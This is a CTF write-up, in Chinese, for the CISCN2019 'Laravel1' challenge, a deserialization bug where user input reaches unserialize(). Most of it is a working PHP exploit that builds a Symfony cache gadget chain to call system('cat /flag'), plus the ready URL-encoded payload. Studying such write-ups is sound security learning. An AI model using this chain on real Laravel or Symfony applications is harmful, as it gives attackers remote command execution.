# \[CISCN2019 总决赛 Day1 Web4]Laravel1

## \[CISCN2019 总决赛 Day1 Web4]Laravel1

## 考点

* Laravel代码审计
* Laravel反序列化链

## wp

给了代码，提示源码在`source.tar.gz`

```php
 <?php
//backup in source.tar.gz

namespace App\Http\Controllers;


class IndexController extends Controller
{
    public function index(\Illuminate\Http\Request $request){
        $payload=$request->input("payload");
        if(empty($payload)){
            highlight_file(__FILE__);
        }else{
            @unserialize($payload);
        }
    }
} 
```

下载源码，是个反序列化漏洞，在`composer.json`看到版本是5.8，还用了`symfony`，版本是4.2



exp

```php
<?php
namespace Symfony\Component\Cache{
    final class CacheItem
    {
        protected $expiry;
        protected $poolHash;
        protected $innerItem;
        public function __construct($expiry, $poolHash, $command)
        {
            $this->expiry = $expiry;
            $this->poolHash = $poolHash;
            $this->innerItem = $command;
        }
    }
}
namespace Symfony\Component\Cache\Adapter{
    class ProxyAdapter
    {
        private $poolHash;
        private $setInnerItem;
        public function __construct($poolHash, $func)
        {
            $this->poolHash = $poolHash;
            $this->setInnerItem = $func;
        }
    }
    class TagAwareAdapter
    {
        private $deferred = [];
        private $pool;
        public function __construct($deferred, $pool)
        {
            $this->deferred = $deferred;
            $this->pool = $pool;
        }
    }
}
namespace {
    $cacheitem = new Symfony\Component\Cache\CacheItem(1,1,"cat /flag");
    $proxyadapter = new Symfony\Component\Cache\Adapter\ProxyAdapter(1,'system');
    $tagawareadapter = new Symfony\Component\Cache\Adapter\TagAwareAdapter(array($cacheitem),$proxyadapter);
    echo urlencode(serialize($tagawareadapter));
}
```

然后访问`?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00expiry%22%3Bi%3A1%3Bs%3A11%3A%22%00%2A%00poolHash%22%3Bi%3A1%3Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A2%3A%7Bs%3A54%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00poolHash%22%3Bi%3A1%3Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3B%7D%7D`

可以得到flag

![](<../../.gitbook/assets/image (20).png>)

## 小结

1. [Laravel5.8.x反序列化POP链](https://xz.aliyun.com/t/5911)
2. [Laravel mockery组件反序列化POP链分析](https://xz.aliyun.com/t/5866)
